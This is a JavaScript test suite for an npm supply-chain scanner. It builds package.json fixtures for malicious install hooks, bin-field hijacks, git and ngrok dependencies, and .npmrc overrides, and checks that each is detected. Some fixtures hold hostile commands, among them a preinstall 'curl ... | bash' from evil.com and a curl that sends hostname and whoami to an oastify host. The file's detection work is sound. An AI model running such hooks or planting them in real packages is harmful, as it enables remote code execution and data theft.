const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, assertNotIncludes, runScan, runScanDirect, runScanFast, cleanupTemp, TESTS_DIR } = require('../test-utils');

async function runPackageTests() {
  console.log('\n=== PACKAGE.JSON TESTS ===\n');

  await asyncTest('PACKAGE: Detects suspicious preinstall (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'package'));
    assertIncludes(output, 'preinstall', 'Should detect preinstall');
  });

  await asyncTest('PACKAGE: Detects suspicious postinstall (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'package'));
    assertIncludes(output, 'postinstall', 'Should detect postinstall');
  });

  // --- bundledDependencies array handling ---

  await asyncTest('PACKAGE: Handles bundledDependencies array', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      bundledDependencies: ['safe-pkg']
    }));
    try {
      const result = await runScanDirect(tmp);
      // Should not crash, bundledDependencies should be processed
      assert(result && typeof result === 'object', 'Should return valid result');
    } finally { cleanupTemp(tmp); }
  });

  // --- DANGEROUS_KEYS filtering ---

  await asyncTest('PACKAGE: Skips __proto__ in dependencies (prototype pollution prevention)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { '__proto__': '1.0.0', 'constructor': '2.0.0' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const protoThreat = result.threats.find(t => t.message && t.message.includes('__proto__'));
      assert(!protoThreat, '__proto__ dependency should be skipped');
    } finally { cleanupTemp(tmp); }
  });

  // --- cleanVersionSpec ---

  await asyncTest('PACKAGE: Handles git URL dependency (skipped in IOC check)', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'some-pkg': 'git+https://github.com/user/repo.git' }
    }));
    try {
      const result = await runScanDirect(tmp);
      // Should not crash on git URL
      assert(result && typeof result === 'object', 'Should handle git URL dependency');
    } finally { cleanupTemp(tmp); }
  });

  // --- Local dependency skip ---

  await asyncTest('PACKAGE: Skips local link: dependencies', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'local-pkg': 'link:../local-pkg' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const localThreat = result.threats.find(t => t.message && t.message.includes('local-pkg'));
      assert(!localThreat, 'link: dependency should be skipped');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: Skips workspace: dependencies', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'workspace-pkg': 'workspace:*' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const wsThreat = result.threats.find(t => t.message && t.message.includes('workspace-pkg'));
      assert(!wsThreat, 'workspace: dependency should be skipped');
    } finally { cleanupTemp(tmp); }
  });

  // --- Lifecycle shell pipe escalation ---

  await asyncTest('PACKAGE: Detects lifecycle shell pipe (curl|sh) as CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { preinstall: 'curl http://evil.com/setup.sh | bash' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_shell_pipe');
      assert(t, 'Should detect lifecycle shell pipe');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- No package.json ---

  await asyncTest('PACKAGE: Returns empty threats for missing package.json', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'index.js'), '// nothing');
    try {
      const result = await runScanDirect(tmp);
      // No package.json, should not crash
      assert(result && typeof result === 'object', 'Should handle missing package.json');
    } finally { cleanupTemp(tmp); }
  });

  // --- devDependencies / optionalDependencies scanning ---

  await asyncTest('PACKAGE: Scans devDependencies and optionalDependencies', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      devDependencies: { 'safe-dev': '1.0.0' },
      optionalDependencies: { 'safe-opt': '1.0.0' }
    }));
    try {
      const result = await runScanDirect(tmp);
      assert(result && typeof result === 'object', 'Should scan dev and optional deps without error');
    } finally { cleanupTemp(tmp); }
  });

  // --- install hook detection (P2) ---

  await asyncTest('PACKAGE: Detects install script hook', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { install: 'node malicious.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' && t.message.includes('"install"'));
      assert(t, 'Should detect install script hook');
    } finally { cleanupTemp(tmp); }
  });

  // --- Dependency URL detection (P3) ---

  await asyncTest('PACKAGE: Detects ngrok dependency URL as CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'depconf': 'https://abc123.ngrok-free.app/pkg.tgz' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
      assert(t, 'Should detect ngrok URL dependency');
      assert(t.severity === 'CRITICAL', 'ngrok URL should be CRITICAL severity');
      assertIncludes(t.message, 'tunnel', 'Should mention tunnel');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: Detects localhost dependency URL as CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'my-dep': 'http://localhost:8080/evil.tgz' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
      assert(t, 'Should detect localhost URL dependency');
      assert(t.severity === 'CRITICAL', 'localhost URL should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: Detects generic HTTPS dependency URL as HIGH', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'my-dep': 'https://example.com/my-package.tgz' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
      assert(t, 'Should detect generic HTTPS URL dependency');
      assert(t.severity === 'HIGH', 'Generic HTTPS URL should be HIGH severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Network commands in non-lifecycle scripts (test, start, etc.) ---

  await asyncTest('PACKAGE: Detects curl in test script', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { test: "curl 'http://evil.oastify.com/?$(hostname)=$(whoami)'" }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script' && t.message.includes('"test"'));
      assert(t, 'Should detect curl in test script');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: No FP for normal test script', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { test: 'jest --coverage', start: 'node index.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_script');
      assert(!t, 'Normal test/start scripts should not trigger');
    } finally { cleanupTemp(tmp); }
  });

  // --- bin field hijack (PKG-013) ---
  console.log('\n=== BIN FIELD HIJACK TESTS ===\n');

  await asyncTest('PACKAGE: bin field hijack — shadows "node" → CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'evil-pkg', version: '1.0.0',
      bin: { node: './evil.js' }
    }));
    fs.writeFileSync(path.join(tmp, 'evil.js'), '#!/usr/bin/env node\nconsole.log("hijacked");');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(t, 'Should detect bin_field_hijack when shadowing node');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: bin field hijack — shadows "npm" → CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'evil-pkg', version: '1.0.0',
      bin: { npm: './shim.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(t, 'Should detect bin_field_hijack when shadowing npm');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: bin field — legitimate command name → NO detection', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'my-tool', version: '1.0.0',
      bin: { 'my-tool': './cli.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(!t, 'Legitimate bin name should NOT trigger bin_field_hijack');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: bin field string shorthand → NO detection', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'my-tool', version: '1.0.0',
      bin: './index.js'
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(!t, 'String shorthand bin with non-system package name should NOT trigger');
    } finally { cleanupTemp(tmp); }
  });

  // --- v2.9.3: bin_field_hijack self-name exemption ---

  await asyncTest('PACKAGE: bin field self-name exemption — npm declaring bin.npm → NO detection', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'npm', version: '10.0.0',
      bin: { npm: './bin/npm-cli.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(!t, 'npm declaring bin.npm is NOT hijacking — it IS npm');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: bin field typosquat — nmp declaring bin.npm → CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'nmp', version: '1.0.0',
      bin: { npm: './evil.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(t, 'Typosquat nmp declaring bin.npm should trigger bin_field_hijack');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: bin field self-name exemption — yarn declaring bin.yarn → NO detection', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'yarn', version: '1.22.0',
      bin: { yarn: './bin/yarn.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bin_field_hijack');
      assert(!t, 'yarn declaring bin.yarn is NOT hijacking — it IS yarn');
    } finally { cleanupTemp(tmp); }
  });

  // --- git dependency RCE (PKG-014) ---
  console.log('\n=== GIT DEPENDENCY RCE TESTS ===\n');

  await asyncTest('PACKAGE: git+ dependency → git_dependency_rce HIGH', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'evil-dep': 'git+https://evil.com/repo.git' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'git_dependency_rce');
      assert(t, 'Should detect git_dependency_rce');
      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: normal semver dependency → NO git_dependency_rce', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { lodash: '^4.17.21' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'git_dependency_rce');
      assert(!t, 'Normal semver dependency should NOT trigger git_dependency_rce');
    } finally { cleanupTemp(tmp); }
  });

  // --- .npmrc git= override (PKG-015) ---
  console.log('\n=== NPMRC GIT OVERRIDE TESTS ===\n');

  await asyncTest('PACKAGE: .npmrc with git= override → CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(tmp, '.npmrc'), 'git=./malicious.sh\nregistry=https://registry.npmjs.org/');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'npmrc_git_override');
      assert(t, 'Should detect npmrc_git_override');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: .npmrc without git= → NO detection', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0'
    }));
    fs.writeFileSync(path.join(tmp, '.npmrc'), 'registry=https://registry.npmjs.org/\nsave-exact=true');
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'npmrc_git_override');
      assert(!t, 'Normal .npmrc should NOT trigger npmrc_git_override');
    } finally { cleanupTemp(tmp); }
  });

  // --- URL dependency severity fix ---

  await asyncTest('PACKAGE: HTTP URL dependency (non-tunnel) → HIGH', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'remote-dep': 'https://packages.storeartifact.com/dep-1.0.0.tgz' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
      assert(t, 'Should detect dependency_url_suspicious');
      assert(t.severity === 'HIGH', `Non-tunnel URL should be HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: HTTP URL dependency (ngrok tunnel) → CRITICAL', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      dependencies: { 'remote-dep': 'https://abc123.ngrok-free.app/pkg.tgz' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
      assert(t, 'Should detect dependency_url_suspicious');
      assert(t.severity === 'CRITICAL', `Tunnel URL should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // --- Bun runtime evasion in lifecycle scripts ---

  await asyncTest('PACKAGE: bun run in postinstall → bun_runtime_evasion', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { postinstall: 'bun run setup.js' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bun_runtime_evasion');
      assert(t, 'Should detect bun_runtime_evasion in lifecycle script');
      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('PACKAGE: bunx in preinstall → bun_runtime_evasion', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
      name: 'test-pkg', version: '1.0.0',
      scripts: { preinstall: 'bunx some-tool' }
    }));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'bun_runtime_evasion');
      assert(t, 'Should detect bun_runtime_evasion with bunx');
    } finally { cleanupTemp(tmp); }
  });

  // Marker tests (grouped under package scanner)
  console.log('\n=== MARKER TESTS ===\n');

  await asyncTest('MARKERS: Detects Shai-Hulud (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'markers'));
    assertIncludes(output, 'Shai-Hulud', 'Should detect Shai-Hulud marker');
  });

  await asyncTest('MARKERS: Detects The Second Coming (fast)', async () => {
    const output = await runScanFast(path.join(TESTS_DIR, 'markers'));
    assertIncludes(output, 'Second Coming', 'Should detect The Second Coming marker');
  });
}

module.exports = { runPackageTests };
